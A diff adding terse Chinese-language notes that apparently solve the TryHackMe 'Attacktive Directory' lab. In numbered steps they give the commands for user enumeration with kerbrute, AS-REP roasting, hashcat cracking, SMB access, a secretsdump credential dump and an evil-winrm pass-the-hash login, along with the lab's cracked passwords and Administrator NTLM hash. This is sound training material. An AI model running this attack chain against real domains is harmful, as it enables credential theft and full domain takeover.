@@ -1,0 +1,39 @@
+nmap -sV -sC -Pn 10.10.173.53 > nmap.txt
+
+1.nmap掃描出端口
+2.使用Enum4linux 掃描
+Enum4linux 10.10.173.53
+3.使用kerbrute掃描發現有帳號
+./kerbrute userenum -d spookysec.local --dc spookysec.local users.txt -t 100
+2021/05/16 11:44:44 >  [+] VALID USERNAME:  svc-admin@spookysec.local
+2021/05/16 11:44:45 >  [+] VALID USERNAME:  James@spookysec.local
+2021/05/16 11:44:45 >  [+] VALID USERNAME:  robin@spookysec.local
+2021/05/16 11:44:48 >  [+] VALID USERNAME:  darkstar@spookysec.local
+2021/05/16 11:44:51 >  [+] VALID USERNAME:  administrator@spookysec.local
+2021/05/16 11:44:55 >  [+] VALID USERNAME:  backup@spookysec.local
+2021/05/16 11:44:57 >  [+] VALID USERNAME:  paradox@spookysec.local
+2021/05/16 11:45:06 >  [+] VALID USERNAME:  JAMES@spookysec.local
+2021/05/16 11:45:09 >  [+] VALID USERNAME:  Robin@spookysec.local
+2021/05/16 11:45:28 >  [+] VALID USERNAME:  Administrator@spookysec.local
+2021/05/16 11:46:12 >  [+] VALID USERNAME:  Darkstar@spookysec.local
+2021/05/16 11:46:25 >  [+] VALID USERNAME:  Paradox@spookysec.local
+2021/05/16 11:47:11 >  [+] VALID USERNAME:  DARKSTAR@spookysec.local
+2021/05/16 11:47:24 >  [+] VALID USERNAME:  ori@spookysec.local
+2021/05/16 11:47:50 >  [+] VALID USERNAME:  ROBIN@spookysec.local
+4.根據查找到的域帳號掃描
+python2 GetNPUsers.py -dc-ip 10.10.19.142 -no-pass -usersfile /home/kali/timmy/TryHackMe/AttacktiveDirect/domain_users.txt spookysec.local/
+5.將kerberoas hash破暴力破解management2005
+hashcat -m 18200  hash /home/kali/timmy/TryHackMe/AttacktiveDirect/password.txt
+6.透過帳號密碼登入samba
+smbclient -L //spookysec.local/ -U svc-admin -p management2005
+7.發現backup資料夾下有backup_credentials.txt
+8.base64姐密後得到密碼
+backup@spookysec.local:backup2517860
+9.使用secretsdump 導出用戶帳密
+sudo python3  secretsdump.py -just-dc backup:backup2517860@spookysec.local
+10.取得administrator的NTLM hash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+11.使用evil-winrm透過hash登入
+evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i spookysec.local
+
+
